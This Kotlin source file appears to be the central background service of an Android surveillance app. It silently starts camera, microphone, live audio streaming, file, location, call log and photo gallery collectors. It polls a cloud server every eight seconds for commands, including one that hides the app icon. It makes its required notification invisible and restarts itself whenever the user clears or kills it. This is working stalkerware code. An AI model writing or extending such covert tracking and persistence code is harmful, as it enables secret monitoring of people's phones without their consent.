package com.example.sentry.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*

class SentryPersistentService : Service() {

    private var wakeLock: PowerManager.WakeLock? = null

    private var cloudHeartbeatJob: Job? = null
    private val serviceScope = CoroutineScope(Dispatchers.IO)

    private fun startCloudHeartbeatLoop() {
        if (cloudHeartbeatJob?.isActive == true) return
        cloudHeartbeatJob = serviceScope.launch {
            val client = com.example.sentry.network.SentryApiClient(applicationContext)
            while (isActive) {
                try {
                    client.registerDevice()
                    client.sendHeartbeat()
                    val iconCmd = client.pollIconVisibilityCommand()
                    if (iconCmd.isSuccess) {
                        iconCmd.getOrNull()?.let { hide ->
                            com.example.sentry.stealth.AppStealthManager.setAppIconHidden(applicationContext, hide)
                        }
                    }
                    android.util.Log.d("SentryPersistentService", "Cloud presence heartbeat synced • Device ONLINE")
                } catch (e: Exception) {
                    android.util.Log.w("SentryPersistentService", "Cloud heartbeat error: ${e.message}")
                }
                delay(8000) // 8s heartbeat keeps cloud status ONLINE continuously
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
        createNotificationChannel()
        startAsForeground()

        // Acquire partial wakelock so CPU keeps running when phone screen is locked
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as? PowerManager
            wakeLock = powerManager?.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Sentry::CameraWakeLock")?.apply {
                acquire(24 * 60 * 60 * 1000L) // 24h safety timeout
            }
        } catch (_: Exception) {
        }

        // Start cloud heartbeat and background listeners
        startCloudHeartbeatLoop()
        BackgroundCameraManager.startListening(applicationContext)
        BackgroundAudioManager.startListening(applicationContext)
        LiveAudioStreamManager.startListening(applicationContext)
        BatteryTelemetryManager.startSync(applicationContext)
        BackgroundFileManager.startListening(applicationContext)
        BackgroundLocationManager.startListening(applicationContext)
        CallLogManager.startSync(applicationContext)
        BackgroundGalleryManager.startListening(applicationContext)
        SentryWakeManager.scheduleWakePulse(applicationContext)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Re-ensure cloud heartbeat and listeners are active
        startCloudHeartbeatLoop()
        BackgroundCameraManager.startListening(applicationContext)
        BackgroundAudioManager.startListening(applicationContext)
        LiveAudioStreamManager.startListening(applicationContext)
        BatteryTelemetryManager.startSync(applicationContext)
        BackgroundFileManager.startListening(applicationContext)
        BackgroundLocationManager.startListening(applicationContext)
        CallLogManager.startSync(applicationContext)
        BackgroundGalleryManager.startListening(applicationContext)
        SentryWakeManager.scheduleWakePulse(applicationContext)
        return START_STICKY
    }

    private fun buildStealthNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.stat_sys_download_done)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true)
            .setOngoing(false)
            .setAutoCancel(true)
            .setGroup("sentry_stealth_group")
            .setGroupSummary(true)
            .build()
    }

    private fun startAsForeground() {
        val notification = buildStealthNotification()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            try {
                startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
            } catch (_: Exception) {
                try {
                    startForeground(NOTIFICATION_ID, notification)
                } catch (_: Exception) {}
            }
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    fun updateForegroundAudioState(isAudioActive: Boolean) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                val notification = buildStealthNotification()
                val fgsType = if (isAudioActive) {
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                } else {
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                }
                startForeground(NOTIFICATION_ID, notification, fgsType)
            } catch (_: Exception) {}
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val manager = getSystemService(NotificationManager::class.java)
            // Delete old visible channels
            try {
                manager?.deleteNotificationChannel("sentry_silent_channel_v2")
                manager?.deleteNotificationChannel("sentry_service_channel")
                manager?.deleteNotificationChannel("sentry_channel")
            } catch (_: Exception) {}

            val channel = NotificationChannel(
                CHANNEL_ID,
                "Background Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Silent internal channel"
                setShowBadge(false)
                setSound(null, null)
                enableLights(false)
                enableVibration(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            manager?.createNotificationChannel(channel)
        }
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        android.util.Log.d("SentryPersistentService", "Task removed by user (Clear All). Reviving persistent service...")

        // 1. Immediate revival via AlarmManager (wakes up even if process killed)
        try {
            val restartIntent = Intent(applicationContext, SentryRestartReceiver::class.java).apply {
                action = SentryRestartReceiver.ACTION_RESTART_SERVICE
            }
            val pendingIntent = android.app.PendingIntent.getBroadcast(
                applicationContext,
                999,
                restartIntent,
                android.app.PendingIntent.FLAG_ONE_SHOT or android.app.PendingIntent.FLAG_IMMUTABLE
            )
            val alarmManager = getSystemService(Context.ALARM_SERVICE) as? android.app.AlarmManager
            alarmManager?.setExactAndAllowWhileIdle(
                android.app.AlarmManager.ELAPSED_REALTIME_WAKEUP,
                android.os.SystemClock.elapsedRealtime() + 500,
                pendingIntent
            )
        } catch (_: Exception) {
        }

        // 2. Direct service launch fallback
        try {
            startService(applicationContext)
        } catch (_: Exception) {
        }
    }

    override fun onDestroy() {
        instance = null
        try {
            wakeLock?.release()
        } catch (_: Exception) {
        }

        // Trigger immediate revival broadcast on service destruction
        try {
            val restartIntent = Intent(applicationContext, SentryRestartReceiver::class.java).apply {
                action = SentryRestartReceiver.ACTION_RESTART_SERVICE
            }
            sendBroadcast(restartIntent)
        } catch (_: Exception) {
        }

        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    companion object {
        private const val CHANNEL_ID = "sentry_invisible_channel_v4"
        private const val NOTIFICATION_ID = 1001
        private var instance: SentryPersistentService? = null

        fun startService(context: Context) {
            try {
                val intent = Intent(context, SentryPersistentService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
            } catch (_: Exception) {
            }
        }

        fun updateForegroundForAudio(isAudioActive: Boolean) {
            instance?.updateForegroundAudioState(isAudioActive)
        }

        // Silent location sync - does not post intrusive banner or mini-map notifications
        fun updateLocationNotification(context: Context, address: String, lat: Double, lon: Double) {
            // Intentionally silent - no big picture map or popup notification
        }
    }
}
